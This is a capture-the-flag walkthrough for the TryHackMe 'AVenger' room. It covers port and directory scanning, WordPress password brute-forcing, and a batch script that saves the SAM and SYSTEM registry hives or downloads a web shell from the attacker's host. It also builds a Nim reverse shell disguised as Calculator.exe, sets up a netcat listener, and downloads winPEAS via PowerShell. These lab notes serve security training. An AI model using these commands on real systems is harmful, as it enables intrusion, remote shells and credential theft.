# AVenger

**Room Link:** [https://tryhackme.com/r/room/avenger](https://tryhackme.com/r/room/avenger)

**Scans**

Initial scan

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (978).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (979).png" alt=""><figcaption></figcaption></figure>

Longer scan

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (984).png" alt=""><figcaption></figcaption></figure>



### **TCP/80 - HTTP** <a href="#tcp-80-http" id="tcp-80-http"></a>

**Find Pages**

There were too many 404 and 403 in the scan so I changed to ffuf to ignore them.

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

**Kali**

```
ffuf -u http://$VICTIM/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -fc 404,403 -e .php,.html,.txt
```

<figure><img src="../../.gitbook/assets/image (981).png" alt=""><figcaption></figcaption></figure>









<figure><img src="../../.gitbook/assets/image (980).png" alt=""><figcaption></figcaption></figure>





The gift folder takes us to avenger.tryhackme

<figure><img src="../../.gitbook/assets/image (982).png" alt=""><figcaption></figcaption></figure>



**Add hostname to host file**

**Kali**

```
echo $VICTIM avenger.tryhackme  >> /etc/hosts
cat /etc/hosts
```

<figure><img src="../../.gitbook/assets/image (983).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ffuf -u http://avenger.tryhackme/gift/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -fc 404,403 -e .php,.html,.txt
```





**Kali**

```
 wpscan --url http://avenger.tryhackme/gift --enumerate p
```

<figure><img src="../../.gitbook/assets/image (987).png" alt=""><figcaption></figcaption></figure>

**Bruteforce admin page**

**Kali**

```
wpscan --url http://avenger.tryhackme/gift --passwords /usr/share/wordlists/rockyou.txt
```



<figure><img src="../../.gitbook/assets/image (988).png" alt=""><figcaption></figcaption></figure>



**Kali**

```
git clone https://github.com/flozz/p0wny-shell.git
cd p0wny-shell/ 
subl exploit.bat
```

**exploit.bat**

<pre><code><strong>@echo off
</strong>
:: Check if the current user is NT AUTHORITY\SYSTEM
whoami /groups | find "S-1-5-18" > nul

if %errorlevel% equ 0 (
    :: Run commands for NT AUTHORITY\SYSTEM
    reg.exe save HKLM\SYSTEM C:\xampp\htdocs\system.bak
    reg.exe save HKLM\SAM C:\xampp\htdocs\sam.bak
) else (
    :: Run commands for other users
    curl http://$KALI:82/shell.php -o C:\xampp\htdocs\shell.php
)
</code></pre>

**Kali**

```
python2 -m SimpleHTTPServer 82
```

<figure><img src="../../.gitbook/assets/image (989).png" alt=""><figcaption></figcaption></figure>





**Kali**

<pre><code>git clone https://github.com/Sn1r/Nim-Reverse-Shell.git
cd Nim-Reverse-Shell/
<strong>apt install mingw-w64 -y
</strong>curl https://nim-lang.org/choosenim/init.sh -sSf | sh
subl rev_shell.nim
</code></pre>

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali #1**

```
/root/.nimble/bin/nim c -d:mingw  --app:gui --opt:speed -o:Calculator.exe rev_shell.nim
```

**Kali #2**

```
rlwrap nc -lvnp 443
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>



#### &#x20;<a href="#transfer-winpeas" id="transfer-winpeas"></a>

**Kali**

```
reg.exe save HKLM\SYSTEM C:\xampp\htdocs\system.bak
reg.exe save HKLM\SAM C:\xampp\htdocs\sam.bak
```

**Victim**

```
cd C:\Users\natbat\Desktop
powershell "(New-Object System.Net.WebClient).Downloadfile('http://$KALI:81/winPEASx64.exe','winPEASx64.exe')" 
winPEASx64.exe
```

